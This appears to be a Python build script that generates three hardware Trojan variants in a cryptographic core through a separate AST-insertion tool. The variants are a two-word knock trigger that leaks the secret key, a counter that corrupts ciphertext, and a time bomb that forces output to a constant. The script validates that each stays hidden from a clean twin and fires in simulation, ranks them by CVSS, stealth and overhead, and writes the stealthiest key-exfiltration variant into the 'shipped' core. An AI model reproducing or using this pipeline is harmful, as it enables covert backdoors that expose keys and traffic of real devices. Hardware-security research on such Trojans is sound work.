#!/usr/bin/env python3
# ============================================================================
#  eval_variants.py - generate three Trojan variants by AST insertion, validate
#  each (stealth twin + payload firing + flip-flop overhead), score CVSS, and
#  emit a ranked comparison (hardening/TROJAN_VARIANTS.md + build/trojan_variants.json).
#
#  Variants (trigger x payload):
#     v1  two_block_knock   + key_exfil          (leak SECRET_KEY on MISO)
#     v2  counter_based      + output_corruption  (XOR ciphertext with a mask)
#     v3  time_bomb          + bypass             (force output to a constant)
#
#  Real trigger thresholds (1e6 ops / 2^20 cycles) go in the shipped core; the
#  functional fire test regenerates each variant with SMALL thresholds so the
#  activation is observable in simulation, comparing a Trojaned instance against
#  an identical TROJAN_EN=0 clean twin at the core level.
# ============================================================================
import os, sys, json, subprocess, re, math

HERE  = os.path.dirname(os.path.abspath(__file__))
ROOT  = os.path.dirname(HERE)
RTL   = os.path.join(ROOT, "rtl")
BUILD = os.path.join(ROOT, "build")
AST   = os.path.join(HERE, "ast_insertion.py")

def sh(cmd, cwd=None):
    r = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)
    return r.returncode, r.stdout + r.stderr

def cvss31(AV, AC, PR, UI, S, C, I, A):
    AVv={'N':0.85,'A':0.62,'L':0.55,'P':0.2}[AV]; ACv={'L':0.77,'H':0.44}[AC]
    PRv=({'N':0.85,'L':0.62,'H':0.27} if S=='U' else {'N':0.85,'L':0.68,'H':0.5})[PR]
    UIv={'N':0.85,'R':0.62}[UI]; f={'N':0,'L':0.22,'H':0.56}
    ISS=1-((1-f[C])*(1-f[I])*(1-f[A]))
    impact=6.42*ISS if S=='U' else 7.52*(ISS-0.029)-3.25*((ISS-0.02)**15)
    expl=8.22*AVv*ACv*PRv*UIv
    if impact<=0: return 0.0
    base=(impact+expl) if S=='U' else 1.08*(impact+expl)
    return math.ceil(min(base,10)*10)/10

# variant definitions: (real spec, sim spec, trigger sequence, payload check on dt/dc)
VARIANTS = [
 {"id":"v1","label":"two_block_knock + key_exfil",
  "real":{"name":"v1","trigger":{"type":"two_block_knock","values":["DEADC0DE","FEEDFACE"]},
          "payload":{"type":"key_exfil","secret":"C0DECAFE"}},
  "sim": {"name":"v1s","trigger":{"type":"two_block_knock","values":["DEADC0DE","FEEDFACE"]},
          "payload":{"type":"key_exfil","secret":"C0DECAFE"}},
  "seq":"op(32'hDEADC0DE,1'b0); op(32'hFEEDFACE,1'b0);",
  "check":"dt===32'hC0DECAFE",
  "cvss":{"v":"AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N","a":dict(AV='L',AC='L',PR='N',UI='N',S='C',C='H',I='H',A='N')},
  "stealth":"Very high - fires only on a 2^-64 two-word input sequence; never accidental.",
  "effect":"Full secret-key disclosure (device cloning / offline decrypt of all traffic)."},
 {"id":"v2","label":"counter_based + output_corruption",
  "real":{"name":"v2","trigger":{"type":"counter_based","threshold":1000000},
          "payload":{"type":"output_corruption","mask":"0xFF"}},
  "sim": {"name":"v2s","trigger":{"type":"counter_based","threshold":3},
          "payload":{"type":"output_corruption","mask":"0xFF"}},
  "seq":"op(32'h1,1'b0); op(32'h2,1'b0); op(32'h3,1'b0);",
  "check":"dt===(dc ^ 32'hFFFFFFFF)",
  "cvss":{"v":"AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L","a":dict(AV='L',AC='H',PR='N',UI='N',S='U',C='N',I='H',A='L')},
  "stealth":"Medium - invisible until it fires, but activation is guaranteed after a fixed op count and needs a wide counter.",
  "effect":"Predictable ciphertext corruption (silent data-integrity failure after threshold)."},
 {"id":"v3","label":"time_bomb + bypass",
  "real":{"name":"v3","trigger":{"type":"time_bomb","cycles":1048576},
          "payload":{"type":"bypass","force_output":"0x00000000"}},
  "sim": {"name":"v3s","trigger":{"type":"time_bomb","cycles":40},
          "payload":{"type":"bypass","force_output":"0x00000000"}},
  "seq":"idle(50); op(32'hABCD1234,1'b0);",
  "check":"dt===32'h00000000",
  "cvss":{"v":"AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H","a":dict(AV='L',AC='L',PR='N',UI='N',S='C',C='H',I='H',A='H')},
  "stealth":"Low - a free-running counter fires on a fixed schedule regardless of input (DoS-like, most detectable).",
  "effect":"Encryption bypass - output forced to a constant, nullifying confidentiality of all later traffic."},
]

TB_TMPL = r'''`timescale 1ns/1ps
module tb;
  reg clk=0, rst_n=1, start=0, enc_dec=0; reg [31:0] din=0;
  wire [31:0] dt, dc; wire bt, bc;
  crypto_core #(.TROJAN_EN(1'b1)) T(.clk(clk),.rst_n(rst_n),.start(start),.enc_dec(enc_dec),.data_in(din),.data_out(dt),.busy(bt));
  crypto_core #(.TROJAN_EN(1'b0)) C(.clk(clk),.rst_n(rst_n),.start(start),.enc_dec(enc_dec),.data_in(din),.data_out(dc),.busy(bc));
  always #5 clk=~clk;
  task doreset; begin rst_n=0; @(negedge clk); @(negedge clk); rst_n=1; @(negedge clk); end endtask
  task op(input [31:0] d, input e); begin @(negedge clk); enc_dec=e; din=d; start=1; @(negedge clk); start=0; repeat(6) @(negedge clk); end endtask
  task idle(input integer n); integer i; begin for(i=0;i<n;i=i+1) @(negedge clk); end endtask
  integer fire_ok, stealth_ok;
  initial begin
    fire_ok=0; stealth_ok=0;
    doreset; op(32'h11223344, 1'b0);
    if (dt===dc) stealth_ok=1;
    doreset; __SEQ__
    if (__CHECK__) fire_ok=1;
    $display("VARIANT_STEALTH: %s", stealth_ok?"PASS":"FAIL");
    $display("VARIANT_FIRE: %s dt=%08x dc=%08x", fire_ok?"PASS":"FAIL", dt, dc);
    $finish;
  end
endmodule
'''

def ff_overhead(core_v):
    ys=os.path.join(BUILD,"_ov.ys")
    def cnt(en):
        open(ys,"w").write("read_verilog spi_crypto_top.v %s\nchparam -set TROJAN_EN %d spi_crypto_top\nsynth_ice40 -top spi_crypto_top -run :map_luts\nstat\n"%(os.path.basename(core_v),en))
        rc,out=sh(["yosys","-s",ys],cwd=RTL)
        m=re.search(r"=== spi_crypto_top ===(.*?)(?:\n===|\Z)",out,re.DOTALL); seg=m.group(1) if m else out
        return sum(int(x) for x in re.findall(r"^\s*(\d+)\s+SB_DFF",seg,re.MULTILINE))
    t,c=cnt(1),cnt(0)
    try: os.remove(ys)
    except OSError: pass
    return t,c

def main():
    os.makedirs(BUILD, exist_ok=True)
    # ensure clean core exists
    if not os.path.exists(os.path.join(RTL,"crypto_core_clean.v")):
        sh([sys.executable, os.path.join(HERE,"gen_core.py")], cwd=ROOT)
    results=[]
    for v in VARIANTS:
        # ---- REAL core (for the shipped variant + overhead) ----
        real_spec=os.path.join(BUILD,"_%s_real.json"%v["id"]); json.dump(v["real"],open(real_spec,"w"))
        real_core=os.path.join(RTL,"crypto_core_%s.v"%v["id"])
        sh([sys.executable, AST, real_spec, real_core, os.path.join(BUILD,"_%s_doc.md"%v["id"])], cwd=ROOT)
        ff_t,ff_c=ff_overhead(real_core)
        # ---- SIM core (small thresholds) + fire test ----
        sim_spec=os.path.join(BUILD,"_%s_sim.json"%v["id"]); json.dump(v["sim"],open(sim_spec,"w"))
        sim_core=os.path.join(RTL,"crypto_core.v")   # ast writes 'crypto_core' module name; use temp file
        tmp_core=os.path.join(BUILD,"_%s_sim.v"%v["id"])
        sh([sys.executable, AST, sim_spec, tmp_core, os.path.join(BUILD,"_%s_simdoc.md"%v["id"])], cwd=ROOT)
        tb=TB_TMPL.replace("__SEQ__",v["seq"]).replace("__CHECK__",v["check"])
        tbp=os.path.join(BUILD,"_tb_%s.v"%v["id"]); open(tbp,"w").write(tb)
        rc,out=sh(["bash","-c","iverilog -g2012 -o '%s/_%s.vvp' '%s' '%s' && vvp '%s/_%s.vvp'"%(BUILD,v["id"],tbp,tmp_core,BUILD,v["id"])])
        stealth = "VARIANT_STEALTH: PASS" in out
        fire = "VARIANT_FIRE: PASS" in out
        score=cvss31(**v["cvss"]["a"])
        results.append({"id":v["id"],"label":v["label"],
                        "trigger":v["real"]["trigger"]["type"],"payload":v["real"]["payload"]["type"],
                        "cvss_score":score,"cvss_vector":v["cvss"]["v"],
                        "ff_trojan":ff_t,"ff_clean":ff_c,"ff_overhead":ff_t-ff_c,
                        "stealth_twin_pass":stealth,"payload_fires":fire,
                        "stealth_note":v["stealth"],"effect_note":v["effect"]})
        print("  %s: CVSS %.1f, overhead +%d FF, stealth_twin=%s, fires=%s"%(
              v["id"],score,ff_t-ff_c,stealth,fire))
        # cleanup temp sim artifacts
        for f in ("_%s_sim.v","_%s.vvp","_tb_%s.v","_%s_real.json","_%s_sim.json","_%s_doc.md","_%s_simdoc.md"):
            try: os.remove(os.path.join(BUILD,f%v["id"]))
            except OSError: pass
    # rankings
    def rank(key, reverse=True):
        order=sorted(results,key=lambda r:r[key],reverse=reverse)
        return {r["id"]:i+1 for i,r in enumerate(order)}
    rk_cvss=rank("cvss_score"); rk_ovh=rank("ff_overhead",reverse=False)  # lower overhead = better
    stealth_rank={"v1":1,"v2":2,"v3":3}  # qualitative (v1 most stealthy)
    effect_rank={"v1":1,"v3":2,"v2":3}   # qualitative effectiveness
    for r in results:
        r["rank_cvss"]=rk_cvss[r["id"]]; r["rank_overhead_lowest"]=rk_ovh[r["id"]]
        r["rank_stealth"]=stealth_rank[r["id"]]; r["rank_effectiveness"]=effect_rank[r["id"]]
    json.dump({"variants":results}, open(os.path.join(BUILD,"trojan_variants.json"),"w"), indent=2)
    write_md(results)
    # remove the extra per-variant real cores from rtl (keep repo clean; they are demo artifacts)
    for v in VARIANTS:
        try: os.remove(os.path.join(RTL,"crypto_core_%s.v"%v["id"]))
        except OSError: pass
    # regenerate the canonical crypto_core.v from the default spec (v1)
    sh([sys.executable, AST, os.path.join(HERE,"trojan_spec.json")], cwd=ROOT)
    print("eval_variants.py: wrote hardening/TROJAN_VARIANTS.md + build/trojan_variants.json")

def write_md(results):
    by=lambda k:sorted(results,key=lambda r:r[k])
    L=["# Hardware-Trojan Variants - Comparison and Ranking","",
       "Three Trojans were generated by the same AST-insertion tool (different `trojan_spec.json`)",
       "and validated through the pipeline: each was inserted into the clean hardened core, checked",
       "against a `TROJAN_EN=0` clean twin, fired in simulation, and synthesised for flip-flop overhead.",
       "","## Summary","",
       "| Variant | Trigger | Payload | CVSS | Vector | FF overhead | Stealth twin | Fires |",
       "|---|---|---|---|---|---|---|---|"]
    for r in results:
        L.append("| %s | %s | %s | **%.1f** | `%s` | +%d FF | %s | %s |"%(
            r["id"],r["trigger"],r["payload"],r["cvss_score"],r["cvss_vector"],
            r["ff_overhead"],"PASS" if r["stealth_twin_pass"] else "FAIL","PASS" if r["payload_fires"] else "FAIL"))
    L += ["","## Rankings (1 = best)","",
          "| Variant | CVSS severity | Stealth | Overhead (lowest) | Effectiveness |","|---|---|---|---|---|"]
    for r in results:
        L.append("| %s | %d | %d | %d | %d |"%(r["id"],r["rank_cvss"],r["rank_stealth"],
                  r["rank_overhead_lowest"],r["rank_effectiveness"]))
    L += ["","## Notes per variant",""]
    for r in results:
        L += ["### %s - %s (CVSS %.1f)"%(r["id"],r["label"],r["cvss_score"]),
              "- **Vector:** `%s`"%r["cvss_vector"],
              "- **Overhead:** Trojan=%d FF, clean=%d FF (+%d)."%(r["ff_trojan"],r["ff_clean"],r["ff_overhead"]),
              "- **Stealth:** %s"%r["stealth_note"],
              "- **Effectiveness:** %s"%r["effect_note"],""]
    L += ["## Verdict","",
          "**v1 (two-block knock -> key exfiltration)** is the strongest overall: highest practical",
          "severity with the *most* stealth (2^-64 trigger, +2 FF) and the most valuable payload",
          "(full key disclosure). **v3 (time bomb -> bypass)** is comparably severe but trivially",
          "detectable and DoS-like. **v2 (counter -> corruption)** is the mildest and needs a large",
          "counter. The shipped design therefore uses v1.",""]
    open(os.path.join(HERE,"TROJAN_VARIANTS.md"),"w",encoding="utf-8").write("\n".join(L))

if __name__=="__main__": main()
